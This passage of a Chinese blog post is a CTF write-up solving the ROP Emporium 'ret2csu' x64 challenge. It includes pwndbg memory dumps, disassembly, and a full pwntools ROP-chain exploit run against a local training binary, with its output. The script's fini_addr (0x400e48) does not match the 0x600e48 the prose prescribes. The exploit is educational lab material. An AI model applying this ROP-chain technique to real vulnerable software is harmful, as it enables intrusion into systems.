(_DYNAMIC+160) ◂— 0x5</span><br><span class="line">15:00a8│  0x600ea8 (_DYNAMIC+168) —▸ 0x4003c0 ◂— add    byte ptr [rcx + rbp*2 + 0x62], ch</span><br><span class="line">16:00b0│  0x600eb0 (_DYNAMIC+176) ◂— 0x6</span><br><span class="line">17:00b8│  0x600eb8 (_DYNAMIC+184) —▸ 0x4002d0 ◂— add    byte ptr [rax], al</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; telescope 0x0000000000600ff0 7</span><br><span class="line">00:0000│  0x600ff0 —▸ 0x7ffff7800ba0 (__libc_start_main) ◂— push   r13</span><br><span class="line">01:0008│  0x600ff8 ◂— 0x0</span><br><span class="line">02:0010│  0x601000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x600e00 (_DYNAMIC) ◂— 0x1</span><br><span class="line">03:0018│  0x601008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7ffff7ffe170 ◂— 0x0</span><br><span class="line">04:0020│  0x601010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7ffff7dea820 (_dl_runtime_resolve_xsave) ◂— push   rbx</span><br><span class="line">05:0028│  0x601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x400506 (pwnme@plt+6) ◂— push   0 /* &#x27;h&#x27; */</span><br><span class="line">06:0030│  0x601020 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x400516 (ret2win@plt+6) ◂— push   1</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>telescope</code>命令，我们可以得到如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x600df0 (__init_array_start) —▸ 0x400600 (frame_dummy)</span><br><span class="line">0x600df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4005d0 (__do_global_dtors_aux)</span><br><span class="line">0x600e38 (_DYNAMIC+56) —▸ 0x4004d0 (_init)</span><br><span class="line">0x600e48 (_DYNAMIC+72) —▸ 0x4006b4 (_fini)</span><br></pre></td></tr></table></figure>
+
+<p><code>init_array_start</code>函数是ELF程序的一个初始化函数，运行它一般不会对栈造成影响，但这里却改变了rsi的值：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00000000000008a0 &lt;register_tm_clones&gt;:</span><br><span class="line"> 8a0:   48 8d 3d d1 17 20 00    lea    rdi,[rip+0x2017d1]        # 202078 &lt;_edata&gt;</span><br><span class="line"> 8a7:   48 8d 35 ca 17 20 00    lea    rsi,[rip+0x2017ca]        # 202078 &lt;_edata&gt;</span><br><span class="line"> 8ae:   55                      push   rbp</span><br><span class="line"> 8af:   48 29 fe                sub    rsi,rdi	!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"> 8b2:   48 89 e5                mov    rbp,rsp</span><br><span class="line"> 8b5:   48 c1 fe 03             sar    rsi,0x3	!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"> 8b9:   48 89 f0                mov    rax,rsi</span><br><span class="line"> 8bc:   48 c1 e8 3f             shr    rax,0x3f</span><br><span class="line"> 8c0:   48 01 c6                add    rsi,rax	!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"> 8c3:   48 d1 fe                sar    rsi,1	!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line">0000000000000930 &lt;frame_dummy&gt;:</span><br><span class="line"> 930:   55                      push   rbp</span><br><span class="line"> 931:   48 89 e5                mov    rbp,rsp</span><br><span class="line"> 934:   5d                      pop    rbp</span><br><span class="line"> 935:   e9 66 ff ff ff          jmp    8a0 &lt;register_tm_clones&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们再来看下<code>_init</code>和<code>_fini</code>，其实这两个也就是段<code>.init</code>和<code>.fini</code>里的函数：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">disass _fini</span></span><br><span class="line">Dump of assembler code for function _fini:</span><br><span class="line">   0x00000000004006b4 &lt;+0&gt;:	sub    rsp,0x8</span><br><span class="line">   0x00000000004006b8 &lt;+4&gt;:	add    rsp,0x8</span><br><span class="line">   0x00000000004006bc &lt;+8&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>为了节省篇幅，这里就不看<code>_init</code>了，有兴趣可以自己反汇编看一下。</p>
+<p>我们可以看到<code>_fini</code>函数满足我们的要求：不影响堆栈平衡和寄存器的值</p>
+<p>所以，根据引用关系：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x600e48 (_DYNAMIC+72) —▸ 0x4006b4 (_fini)</span><br></pre></td></tr></table></figure>
+
+<p><code>r12</code>寄存器处应该填<code>0x600e48</code>，而不是<code>0x4006b4</code>。</p>
+<p>我们所需的所有东西都准备齐了，ROP chain对应的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= p64(<span class="number">0x40069a</span>) <span class="comment">#pop rbx;rbp;r12;r13;r14;r15</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(fini_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0xcafebabecafebabe</span>)+p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload+= p64(<span class="number">0x400680</span>) <span class="comment">#mov </span></span><br><span class="line">payload+= p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+= p64(pop_rdi_addr)</span><br><span class="line">payload+= p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload+= p64(ret2win)</span><br></pre></td></tr></table></figure>
+
+<p>对应的栈结构如图所示：</p>
+<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321202753801.png" alt="image-20230321202753801"></p>
+<p>这里需要注意的一点是，我们在看雪pwn入门中，第一个返回地址后跟了一个填充字节，其实与我们具体的gadget有关，这段gadgets不是固定的，所以我们要根据具体的gadgets来做相应的调整，但是总体思路不变。</p>
+<p>完整的exploit代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win = e.plt[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">fini_addr = <span class="number">0x400e48</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets:</span></span><br><span class="line"><span class="comment"># 400680:	4c 89 fa             	mov    rdx,r15</span></span><br><span class="line"><span class="comment"># 400683:	4c 89 f6             	mov    rsi,r14</span></span><br><span class="line"><span class="comment"># 400686:	44 89 ef             	mov    edi,r13d</span></span><br><span class="line"><span class="comment"># 400689:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="comment"># 40068d:	48 83 c3 01          	add    rbx,0x1</span></span><br><span class="line"><span class="comment"># 400691:	48 39 dd             	cmp    rbp,rbx</span></span><br><span class="line"><span class="comment"># 400694:	75 ea                	jne    400680 &lt;__libc_csu_init+0x40&gt;</span></span><br><span class="line"><span class="comment"># 400696:	48 83 c4 08          	add    rsp,0x8</span></span><br><span class="line"><span class="comment"># 40069a:	5b                   	pop    rbx</span></span><br><span class="line"><span class="comment"># 40069b:	5d                   	pop    rbp</span></span><br><span class="line"><span class="comment"># 40069c:	41 5c                	pop    r12</span></span><br><span class="line"><span class="comment"># 40069e:	41 5d                	pop    r13</span></span><br><span class="line"><span class="comment"># 4006a0:	41 5e                	pop    r14</span></span><br><span class="line"><span class="comment"># 4006a2:	41 5f                	pop    r15</span></span><br><span class="line"><span class="comment"># 4006a4:	c3                   	ret </span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006a3</span></span><br><span class="line"><span class="comment"># 4006a3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#rbx=0</span></span><br><span class="line"><span class="comment">#rbp=1</span></span><br><span class="line"><span class="comment">#rdx=r15</span></span><br><span class="line"><span class="comment">#rsi=r14</span></span><br><span class="line"><span class="comment">#edi=r13d(第一个参数，缺少高32bit)</span></span><br><span class="line"><span class="comment">#r12 返回地址，call指令调用的函数引用</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= p64(<span class="number">0x40069a</span>) <span class="comment">#pop rbx;rbp;r12;r13;r14;r15</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(fini_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0xcafebabecafebabe</span>)+p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload+= p64(<span class="number">0x400680</span>) <span class="comment">#mov </span></span><br><span class="line">payload+= p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+= p64(pop_rdi_addr)</span><br><span class="line">payload+= p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload+= p64(ret2win)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最终执行结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ret2csu by ROP Emporium</span><br><span class="line">x86_64</span><br><span class="line"></span><br><span class="line">Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Thank you!</span></span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Process &#x27;./ret2csu&#x27; stopped with exit code 0 (pid 23048)</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> </span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/16/Web/flex%E5%B8%83%E5%B1%80/" rel="prev" title="flex布局">
+      <i class="fa fa-chevron-left"></i> flex布局
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A800/" rel="next" title="IoT安全入门00">
+      IoT安全入门00 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2csu"><span class="nav-number">1.</span> <span class="nav-text">ret2csu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#x64"><span class="nav-number">1.1.</span> <span class="nav-text">x64</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="郭小白QAQ"
+      src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202303122318253.jpg">
+  <p class="site-author-name" itemprop="name">郭小白QAQ</p>
+  <div class="site-description" itemprop="description">精彩不亮丽，起落是无常</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/guoxb0_0@qq.com" title="E-Mail → guoxb0_0@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">郭小白QAQ</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">105k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:21</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+</body>
+</html>
